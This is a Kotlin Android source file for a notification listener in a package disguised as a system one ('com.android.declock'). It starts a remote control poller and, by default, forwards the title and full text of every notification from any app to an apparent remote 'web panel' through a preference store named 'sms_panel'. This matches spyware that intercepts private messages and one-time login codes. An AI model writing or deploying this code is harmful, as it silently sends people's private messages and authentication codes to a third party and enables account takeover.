package com.android.declock

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log

class NotificationService : NotificationListenerService() {
    private lateinit var poller: ControlPoller

    override fun onCreate() {
        super.onCreate()
        poller = ControlPoller(this)
        poller.start()
    }

    override fun onDestroy() {
        if (::poller.isInitialized) poller.stop()
        super.onDestroy()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val prefs = getSharedPreferences("sms_panel", MODE_PRIVATE)
        if (!prefs.getBoolean("forwarding_enabled", true)) return

        val packageName = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val bigText = extras.getCharSequence("android.bigText")?.toString() ?: text
        val appLabel = DeviceInfo.appLabel(this, packageName)

        Log.d("NotificationService", "Panel event: $appLabel / $title")
        WebPanelSender.send(this, packageName, appLabel, title, bigText)
    }
}
